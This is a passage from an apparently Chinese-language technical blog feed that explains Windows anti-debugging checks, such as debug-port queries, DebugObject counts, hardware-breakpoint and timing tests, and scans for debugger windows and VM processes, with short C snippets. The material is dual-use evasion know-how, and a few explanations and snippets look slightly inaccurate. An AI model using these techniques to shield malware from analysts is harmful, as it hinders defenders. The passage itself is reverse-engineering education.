&lt;anonymous-tag&gt;</span><br><span class="line">  +0x458 PartitionObject  : Ptr32 Void</span><br><span class="line">  +0x460 SecurityDomain   : Uint8B</span><br><span class="line">  +0x468 ParentSecurityDomain : Uint8B</span><br><span class="line">  +0x470 CoverageSamplerContext : Ptr32 Void</span><br><span class="line">  +0x474 MmHotPatchContext : Ptr32 Void</span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckRemoteDebuggerPresent(</span><br><span class="line">  [in]      HANDLE hProcess,</span><br><span class="line">  [in, out] PBOOL  pbDebuggerPresent</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>底层为调用NtQueryInformationProcess(ProcessDebugPort)</p><h4 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQueryInformationProcess(</span><br><span class="line">  [in]            HANDLE           ProcessHandle,</span><br><span class="line">  [in]            PROCESSINFOCLASS ProcessInformationClass,</span><br><span class="line">  [out]           PVOID            ProcessInformation,</span><br><span class="line">  [in]            ULONG            ProcessInformationLength,</span><br><span class="line">  [out, optional] PULONG           ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="ProcessDebugPort-0x07"><a href="#ProcessDebugPort-0x07" class="headerlink" title="ProcessDebugPort (0x07)"></a>ProcessDebugPort (0x07)</h5><p>EPROCESS-&gt;DebugPort:当调试器附加到进程时，系统会将调试器的端口对象地址填入被调试进程 <code>EPROCESS</code> 结构体的 <code>DebugPort</code> 字段中，如果返回的 <code>ProcessInformation</code>（即端口号）不为 0，程序就判定自己被调试了 。</p><h5 id="ProcessDebugObjectHandle-0x1E"><a href="#ProcessDebugObjectHandle-0x1E" class="headerlink" title="ProcessDebugObjectHandle (0x1E)"></a>ProcessDebugObjectHandle (0x1E)</h5><p>同样是检查 <code>EPROCESS-&gt;DebugPort</code>，调试器会为被调试的进程创建一个调试对象，该参数能获取调试对象的句柄,不为0则为调试。</p><h5 id="ProcessDebugFlags-0x1F"><a href="#ProcessDebugFlags-0x1F" class="headerlink" title="ProcessDebugFlags (0x1F)"></a>ProcessDebugFlags (0x1F)</h5><p>EPROCESS-&gt;FLAGS（NoDebugInherit比特位）<code>NoDebugInherit</code> 标志位用于指示子进程是否应该继承父进程的调试状态。</p><p>NtQueryInformationProcess函数的返回值为0，则正在调试进程。</p><h4 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQuerySystemInformation(</span><br><span class="line">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  [in, out]       PVOID                    SystemInformation,</span><br><span class="line">  [in]            ULONG                    SystemInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>读取内核变量 <code>KdDebuggerEnabled</code> 和 <code>KdPitchDebugger</code>，调试状态下 <code>SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerEnabled</code>值和 <code>KernelDebuggerNotPresent</code>值为1。这些内核变量的值会被映射到用户层可读的共享页面 KUSER_SHARED_DATA中，因此也可以读取该结构体</p><h5 id="内核KUSER-SHARED-DATA-结构体"><a href="#内核KUSER-SHARED-DATA-结构体" class="headerlink" title="内核KUSER_SHARED_DATA 结构体"></a>内核KUSER_SHARED_DATA 结构体</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">dt _KUSER_SHARED_DATA     // win11前</span><br><span class="line">nt!_KUSER_SHARED_DATA</span><br><span class="line">   +0x000 TickCountLowDeprecated : Uint4B</span><br><span class="line">   +0x004 TickCountMultiplier : Uint4B</span><br><span class="line">   +0x008 InterruptTime    : _KSYSTEM_TIME</span><br><span class="line">   +0x014 SystemTime       : _KSYSTEM_TIME</span><br><span class="line">   +0x020 TimeZoneBias     : _KSYSTEM_TIME</span><br><span class="line">   +0x02c ImageNumberLow   : Uint2B</span><br><span class="line">   +0x02e ImageNumberHigh  : Uint2B</span><br><span class="line">   +0x030 NtSystemRoot     : [260] Wchar</span><br><span class="line">   +0x238 MaxStackTraceDepth : Uint4B</span><br><span class="line">   +0x23c CryptoExponent   : Uint4B</span><br><span class="line">   +0x240 TimeZoneId       : Uint4B</span><br><span class="line">   +0x244 LargePageMinimum : Uint4B</span><br><span class="line">   +0x248 AitSamplingValue : Uint4B</span><br><span class="line">   +0x24c AppCompatFlag    : Uint4B</span><br><span class="line">   +0x250 RNGSeedVersion   : Uint8B</span><br><span class="line">   +0x258 GlobalValidationRunlevel : Uint4B</span><br><span class="line">   +0x25c TimeZoneBiasStamp : Int4B</span><br><span class="line">   +0x260 NtBuildNumber    : Uint4B</span><br><span class="line">   +0x264 NtProductType    : _NT_PRODUCT_TYPE</span><br><span class="line">   +0x268 ProductTypeIsValid : UChar</span><br><span class="line">   +0x269 Reserved0        : [1] UChar</span><br><span class="line">   +0x26a NativeProcessorArchitecture : Uint2B</span><br><span class="line">   +0x26c NtMajorVersion   : Uint4B</span><br><span class="line">   +0x270 NtMinorVersion   : Uint4B</span><br><span class="line">   +0x274 ProcessorFeatures : [64] UChar</span><br><span class="line">   +0x2b4 Reserved1        : Uint4B</span><br><span class="line">   +0x2b8 Reserved3        : Uint4B</span><br><span class="line">   +0x2bc TimeSlip         : Uint4B</span><br><span class="line">   +0x2c0 AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE</span><br><span class="line">   +0x2c4 BootId           : Uint4B</span><br><span class="line">   +0x2c8 SystemExpirationDate : _LARGE_INTEGER</span><br><span class="line">   +0x2d0 SuiteMask        : Uint4B</span><br><span class="line">   +0x2d4 KdDebuggerEnabled : UChar                            // &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;  划重点 </span><br><span class="line">   +0x2d5 MitigationPolicies : UChar</span><br><span class="line">   +0x2d5 NXSupportPolicy  : Pos 0, 2 Bits</span><br><span class="line">   +0x2d5 SEHValidationPolicy : Pos 2, 2 Bits</span><br><span class="line">   +0x2d5 CurDirDevicesSkippedForDlls : Pos 4, 2 Bits</span><br><span class="line">   +0x2d5 Reserved         : Pos 6, 2 Bits</span><br><span class="line">   +0x2d6 Reserved6        : [2] UChar</span><br><span class="line">   +0x2d8 ActiveConsoleId  : Uint4B</span><br><span class="line">   +0x2dc DismountCount    : Uint4B</span><br><span class="line">   +0x2e0 ComPlusPackage   : Uint4B</span><br><span class="line">   +0x2e4 LastSystemRITEventTickCount : Uint4B</span><br><span class="line">   +0x2e8 NumberOfPhysicalPages : Uint4B</span><br><span class="line">   +0x2ec SafeBootMode     : UChar</span><br><span class="line">   +0x2ed VirtualizationFlags : UChar</span><br><span class="line">   +0x2ee Reserved12       : [2] UChar</span><br><span class="line">   +0x2f0 SharedDataFlags  : Uint4B</span><br><span class="line">   +0x2f0 DbgErrorPortPresent : Pos 0, 1 Bit</span><br><span class="line">   +0x2f0 DbgElevationEnabled : Pos 1, 1 Bit</span><br><span class="line">   +0x2f0 DbgVirtEnabled   : Pos 2, 1 Bit</span><br><span class="line">   +0x2f0 DbgInstallerDetectEnabled : Pos 3, 1 Bit</span><br><span class="line">   +0x2f0 DbgLkgEnabled    : Pos 4, 1 Bit</span><br><span class="line">   +0x2f0 DbgDynProcessorEnabled : Pos 5, 1 Bit</span><br><span class="line">   +0x2f0 DbgConsoleBrokerEnabled : Pos 6, 1 Bit</span><br><span class="line">   +0x2f0 DbgSecureBootEnabled : Pos 7, 1 Bit</span><br><span class="line">   +0x2f0 DbgMultiSessionSku : Pos 8, 1 Bit</span><br><span class="line">   +0x2f0 DbgMultiUsersInSessionSku : Pos 9, 1 Bit</span><br><span class="line">   +0x2f0 DbgStateSeparationEnabled : Pos 10, 1 Bit</span><br><span class="line">   +0x2f0 SpareBits        : Pos 11, 21 Bits</span><br><span class="line">   +0x2f4 DataFlagsPad     : [1] Uint4B</span><br><span class="line">   +0x2f8 TestRetInstruction : Uint8B</span><br><span class="line">   +0x300 QpcFrequency     : Int8B</span><br><span class="line">   +0x308 SystemCall       : Uint4B</span><br><span class="line">   +0x30c SystemCallPad0   : Uint4B</span><br><span class="line">   +0x310 SystemCallPad    : [2] Uint8B</span><br><span class="line">   +0x320 TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +0x320 TickCountQuad    : Uint8B</span><br><span class="line">   +0x320 ReservedTickCountOverlay : [3] Uint4B</span><br><span class="line">   +0x32c TickCountPad     : [1] Uint4B</span><br><span class="line">   +0x330 Cookie           : Uint4B</span><br><span class="line">   +0x334 CookiePad        : [1] Uint4B</span><br><span class="line">   +0x338 ConsoleSessionForegroundProcessId : Int8B</span><br><span class="line">   +0x340 TimeUpdateLock   : Uint8B</span><br><span class="line">   +0x348 BaselineSystemTimeQpc : Uint8B</span><br><span class="line">   +0x350 BaselineInterruptTimeQpc : Uint8B</span><br><span class="line">   +0x358 QpcSystemTimeIncrement : Uint8B</span><br><span class="line">   +0x360 QpcInterruptTimeIncrement : Uint8B</span><br><span class="line">   +0x368 QpcSystemTimeIncrementShift : UChar</span><br><span class="line">   +0x369 QpcInterruptTimeIncrementShift : UChar</span><br><span class="line">   +0x36a UnparkedProcessorCount : Uint2B</span><br><span class="line">   +0x36c EnclaveFeatureMask : [4] Uint4B</span><br><span class="line">   +0x37c TelemetryCoverageRound : Uint4B</span><br><span class="line">   +0x380 UserModeGlobalLogger : [16] Uint2B</span><br><span class="line">   +0x3a0 ImageFileExecutionOptions : Uint4B</span><br><span class="line">   +0x3a4 LangGenerationCount : Uint4B</span><br><span class="line">   +0x3a8 Reserved4        : Uint8B</span><br><span class="line">   +0x3b0 InterruptTimeBias : Uint8B</span><br><span class="line">   +0x3b8 QpcBias          : Uint8B</span><br><span class="line">   +0x3c0 ActiveProcessorCount : Uint4B</span><br><span class="line">   +0x3c4 ActiveGroupCount : UChar</span><br><span class="line">   +0x3c5 Reserved9        : UChar</span><br><span class="line">   +0x3c6 QpcData          : Uint2B</span><br><span class="line">   +0x3c6 QpcBypassEnabled : UChar</span><br><span class="line">   +0x3c7 QpcShift         : UChar</span><br><span class="line">   +0x3c8 TimeZoneBiasEffectiveStart : _LARGE_INTEGER</span><br><span class="line">   +0x3d0 TimeZoneBiasEffectiveEnd : _LARGE_INTEGER</span><br><span class="line">   +0x3d8 XState           : _XSTATE_CONFIGURATION</span><br></pre></td></tr></table></figure><p>KUSER_SHARED_DATA-&gt;KdDebuggerEnabled</p><p>检查第 0 位（0x1）：如果为 1，表示内核调试器已启用；检查第1位(0x2)：如果为 0，表示调试器存在。</p><h4 id="NtQueryObject"><a href="#NtQueryObject" class="headerlink" title="NtQueryObject"></a>NtQueryObject</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSYSCALLAPI NTSTATUS NtQueryObject(</span><br><span class="line">  [in, optional]  HANDLE                   Handle,</span><br><span class="line">  [in]            OBJECT_INFORMATION_CLASS ObjectInformationClass,</span><br><span class="line">  [out, optional] PVOID                    ObjectInformation,</span><br><span class="line">  [in]            ULONG                    ObjectInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="ObjectAllTypesInformation"><a href="#ObjectAllTypesInformation" class="headerlink" title="ObjectAllTypesInformation"></a>ObjectAllTypesInformation</h5><p>Windows 内核中每种对象（如文件、互斥体、调试对象）都有一个 <code>OBJECT_TYPE</code> 结构来描述。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE_INFORMATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UNICODE_STRING TypeName;</span><br><span class="line">    ULONG TotalNumberOfObjects;</span><br><span class="line">    ULONG TotalNumberOfHandles;</span><br><span class="line">    ULONG TotalPagedPoolUsage;</span><br><span class="line">    ULONG TotalNonPagedPoolUsage;</span><br><span class="line">    ULONG TotalNamePoolUsage;</span><br><span class="line">    ULONG TotalHandleTableUsage;</span><br><span class="line">    ULONG HighWaterNumberOfObjects;</span><br><span class="line">    ULONG HighWaterNumberOfHandles;</span><br><span class="line">    ULONG HighWaterPagedPoolUsage;</span><br><span class="line">    ULONG HighWaterNonPagedPoolUsage;</span><br><span class="line">    ULONG HighWaterNamePoolUsage;</span><br><span class="line">    ULONG HighWaterHandleTableUsage;</span><br><span class="line">    ULONG InvalidAttributes;</span><br><span class="line">    GENERIC_MAPPING GenericMapping;</span><br><span class="line">    ULONG ValidAccessMask;</span><br><span class="line">    BOOLEAN SecurityRequired;</span><br><span class="line">    BOOLEAN MaintainHandleCount;</span><br><span class="line">    UCHAR TypeIndex; <span class="comment">// since WINBLUE</span></span><br><span class="line">    CHAR ReservedByte;</span><br><span class="line">    ULONG PoolType;</span><br><span class="line">    ULONG DefaultPagedPoolCharge;</span><br><span class="line">    ULONG DefaultNonPagedPoolCharge;</span><br><span class="line">&#125; OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;</span><br></pre></td></tr></table></figure><ul><li>API 逻辑 : 遍历所有对象类型，找到名称为 “DebugObject” 的类型结构。</li><li>判断依据 : 读取该类型结构下的 <code>TotalNumberOfObjects</code> 字段。</li><li>核心逻辑 : 只要有调试器在工作，它就必须创建一个DebugObject类型的内核对象。如果检测到该对象的数量 &gt; 0（或者大于你程序自己创建的数量），就说明系统中存在调试器。</li></ul><h5 id="ObjectTypeInformation"><a href="#ObjectTypeInformation" class="headerlink" title="ObjectTypeInformation"></a>ObjectTypeInformation</h5><p>NtCreateDebugObject创建一个调试对象句柄，然后再查询该调试对象类型的对象总数，&gt;1则说明有调试</p><h3 id="线程上下文检测"><a href="#线程上下文检测" class="headerlink" title="线程上下文检测"></a>线程上下文检测</h3><h4 id="NtQueryInformationThread或者GetThreadContext"><a href="#NtQueryInformationThread或者GetThreadContext" class="headerlink" title="NtQueryInformationThread或者GetThreadContext"></a>NtQueryInformationThread或者GetThreadContext</h4><p>检查 ETHREAD -&gt;KTHREAD -&gt; TrapFrame的Dr0~Dr7寄存器来判断硬件断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQueryInformationThread(</span><br><span class="line">  [in]            HANDLE          ThreadHandle,</span><br><span class="line">  [in]            THREADINFOCLASS ThreadInformationClass,</span><br><span class="line">  [in, out]       PVOID           ThreadInformation,</span><br><span class="line">  [in]            ULONG           ThreadInformationLength,</span><br><span class="line">  [out, optional] PULONG          ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="NtSetInformationThread"><a href="#NtSetInformationThread" class="headerlink" title="NtSetInformationThread"></a>NtSetInformationThread</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI NTSTATUS ZwSetInformationThread(</span><br><span class="line">  [in] HANDLE          ThreadHandle,</span><br><span class="line">  [in] THREADINFOCLASS ThreadInformationClass,</span><br><span class="line">  [in] PVOID           ThreadInformation,</span><br><span class="line">  [in] ULONG           ThreadInformationLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>当调用 <code>NtSetInformationThread</code> 并传入 <code>ThreadHideFromDebugger</code> 时，内核将当前线程 <code>ETHREAD</code> 结构中的 <code>HideFromDebugger</code> (位于 <code>ETHREAD-&gt;ThreadFlags</code> 或 <code>CrossThreadFlags</code> 位域中)标志位置为 1。一旦置位，当该线程触发异常（如断点）时，内核会忽略调试器，直接将异常派发给进程自身处理。如果进程处理不了，程序就会崩溃（从而达到反调试目的）。</p><h3 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h3><p>利用“调试器会优先接管异常”的机制。如果程序自己制造一个异常，且成功捕获了它，说明没有调试器（或者调试器把异常透传了）；如果程序没捕获到或者行为异常，说明有调试器干扰。</p><h4 id="CloseHandle等"><a href="#CloseHandle等" class="headerlink" title="CloseHandle等"></a>CloseHandle等</h4><p>传入一个无效的句柄</p><ul><li><strong>有调试器</strong> : 会触发 <code>0xC0000008</code> (Invalid Handle) 异常，调试器通常会暂停。</li><li><strong>无调试器</strong> : 函数返回 <code>FALSE</code>，或者通过 <code>__except</code> 捕获异常继续运行。</li></ul><p>其他函数诸如NtGetContextThread、NtQueryInformationProcess、CloseWindow等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        CloseHandle((HANDLE)<span class="number">672368</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    __except(EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;debugger&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用 <code>SetHandleInformation</code>将互斥体句柄标记为“禁止关闭” (<code>HANDLE_FLAG_PROTECT_FROM_CLOSE</code>)，然后强行关闭它。</p><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>HANDLE_FLAG_PROTECT_FROM_CLOSE（0x2）</td><td>如果设置了此标志，则调用<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/handleapi/nf-handleapi-closehandle">CloseHandle</a> 函数不会关闭对象句柄。</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">CheckCloseHandle2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> hMutex = CreateMutexA(<span class="literal">NULL</span>, FALSE, <span class="string">&quot;ntdil.dli&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_VALID_HANDLE(hMutex))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (SetHandleInformation(hMutex, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE))</span><br><span class="line">&#123;</span><br><span class="line">__try </span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hMutex);</span><br><span class="line">&#125;</span><br><span class="line">__except (HANDLE_FLAG_PROTECT_FROM_CLOSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="时间差检测"><a href="#时间差检测" class="headerlink" title="时间差检测"></a>时间差检测</h3><p>调试器的处理（中断、单步执行、异常处理）会消耗大量 CPU 周期。可以使用GetTickCount或者QueryPerformanceCounter、rdtsc指令</p><h4 id="rdtsc"><a href="#rdtsc" class="headerlink" title="rdtsc"></a>rdtsc</h4><p><code>rdtsc</code> 指令会将 CPU 上电以来的时钟周期数读取到寄存器（<code>EDX:EAX</code>）中。程序在执行一段指令前后分别调用两次 <code>rdtsc</code>，计算两次结果的差值</p><h4 id="NtSetSystemInformation-Time-Slip"><a href="#NtSetSystemInformation-Time-Slip" class="headerlink" title="NtSetSystemInformation (Time Slip)"></a>NtSetSystemInformation (Time Slip)</h4><p>创建一个事件对象，如果系统中存在内核调试器且处于中断状态，系统时钟会“滑移”（停止走动）。该函数可以检测这种滑移并触发事件。如果 <code>WaitForSingleObject</code> 等到了信号，说明发生了时钟滑移，即存在调试行为。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">CheckSystemTime</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> bRet = <span class="literal">false</span>;</span><br><span class="line">BOOLEAN bAdjustPrivRet;</span><br><span class="line"><span class="keyword">auto</span> ntStatus =RtlAdjustPrivilege(SE_SYSTEMTIME_PRIVILEGE, TRUE, FALSE, &amp;bAdjustPrivRet);</span><br><span class="line"><span class="keyword">if</span> (NT_SUCCESS(ntStatus))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> hEvent = CreateEventA(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_VALID_HANDLE(hEvent))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (NT_SUCCESS(NtSetSystemInformation(SystemTimeSlipNotification, &amp;hEvent, <span class="keyword">sizeof</span>(hEvent))))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (WaitForSingleObject(hEvent, <span class="number">1</span>) == WAIT_OBJECT_0) <span class="comment">//如果为有信号,说明进程处于中断状态</span></span><br><span class="line">bRet = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hEvent);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="环境与启动特征-Environment-Boot"><a href="#环境与启动特征-Environment-Boot" class="headerlink" title="环境与启动特征 (Environment &amp; Boot)"></a>环境与启动特征 (Environment &amp; Boot)</h3><h4 id="系统启动选项-SystemStartOptions"><a href="#系统启动选项-SystemStartOptions" class="headerlink" title="系统启动选项 (SystemStartOptions)"></a>系统启动选项 (SystemStartOptions)</h4><p>读取注册表 <code>HKLM\System\CurrentControlSet\Control\SystemStartOptions</code>。</p><p>检查字符串中是否包含 “DEBUG”。这通常意味着系统是以调试模式（如 <code>/DEBUG</code> 开关）启动的。</p><h4 id="窗口与进程扫描"><a href="#窗口与进程扫描" class="headerlink" title="窗口与进程扫描"></a>窗口与进程扫描</h4><p>使用 <code>FindWindow</code> 查找类名或标题为 “OllyDbg”, “x64dbg” 的窗口。</p><p>扫描进程列表（<code>CreateToolhelp32Snapshot</code>）查找 <code>VMWareService.exe</code> 等虚拟机进程（虚拟机常用于逆向分析）</p><h4 id="驱动-设备对象扫描"><a href="#驱动-设备对象扫描" class="headerlink" title="驱动&#x2F;设备对象扫描"></a>驱动&#x2F;设备对象扫描</h4><p>尝试打开特定的驱动设备名，如 <code>\\.\Syser</code> (Syser Debugger), <code>\\.\SICE</code> (SoftICE), <code>\\.\NtICE</code> 等。如果能成功打开句柄，说明由于反调试驱动存在。</p><h2 id="反沙箱"><a href="#反沙箱" class="headerlink" title="反沙箱"></a>反沙箱</h2>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows dll注入和api hook</title>
      <link href="/2025/12/12/2025-12-12-windows_dll_injection/"/>
      <url>/2025/12/12/2025-12-12-windows_dll_injection/</url>
      
